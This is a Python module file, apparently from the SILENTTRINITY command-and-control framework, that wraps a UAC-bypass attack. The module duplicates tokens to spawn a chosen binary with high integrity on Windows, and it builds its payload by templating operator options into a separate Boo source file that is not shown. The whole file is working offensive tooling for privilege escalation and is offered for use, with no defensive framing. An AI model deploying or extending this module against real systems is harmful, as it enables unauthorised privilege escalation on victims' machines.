from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/uactokenmagic'
        self.language = 'boo'
        self.description = 'Bypasses UAC through token duplication and spawns a specified process. (Requires Admin)'
        self.author = '@Daudau'
        self.references = []
        self.options = {
            'Binary': {
                'Description': 'The binary to execute with high integrity.',
                'Required': True,
                'Value': ""
            },
            'Arguments': {
                'Description': 'Arguments to pass to the binary.',
                'Required': True,
                'Value': ""
            },
            'Path': {
                'Description': 'Path that the binary resides in.',
                'Required': True,
                'Value': ""
            },
            'ProcessId': {
                'Description': 'Specify the process for which to perform token duplication. By default (0), all appropriate processes will be tried.',
                'Required': True,
                'Value': 0
            },
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/bypassUAC.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('BINARY', str(self.options['Binary']['Value']))
            src = src.replace('ARGUMENTS', str(self.options['Arguments']['Value']))
            src = src.replace('PATH', str(self.options['Path']['Value']))
            src = src.replace('PROCESS_ID', str(self.options['ProcessId']['Value']))
            return src
